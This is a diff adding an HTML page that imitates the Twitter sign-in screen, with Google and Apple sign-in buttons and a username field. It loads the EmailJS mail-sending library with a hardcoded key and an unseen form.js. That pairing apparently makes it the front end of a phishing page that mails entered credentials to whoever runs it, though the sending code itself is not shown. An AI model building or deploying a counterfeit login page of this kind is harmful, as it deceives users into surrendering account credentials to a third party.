@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Twitter Login Page </title>
+
+    
+    <!----------link Favicon---------->
+    <link rel="shortcut icon" href="favicon twitter.png" type="image/x-icon">
+    <!--------link Fontawesome-------->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" 
+    integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
+    crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <!------------LINK CSS------------>
+    <link rel="stylesheet" href="form.css">
+</head>
+<body>
+
+    <div class="login-box">
+            <img src="favicon twitter.png" alt="twitter img" class="logo" >
+            <h2>Sign in to Twitter</h2>
+            <button class="google"> <img src="images/google img.ico" > Sign in with Google</button>
+            <button class="apple"> <img src="images/pple img.png" > Sign in with Apple</button>
+            <hr>
+            <span>Or</span>
+            <form id="text" >
+                <input type="text" placeholder="Phone,email or username">
+                <button id="next-btn">Next</button>
+
+            </form>
+            <button class="pass"> Forget Password?</button>
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+    
+
+    <!------------LINK JS------------>
+    <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+<script type="text/javascript">
+(function(){
+  emailjs.init("ZqKuiZff4aqnGnsJs");
+})();
+</script>
+    <script src="form.js"></script>
+</body>
+</html>
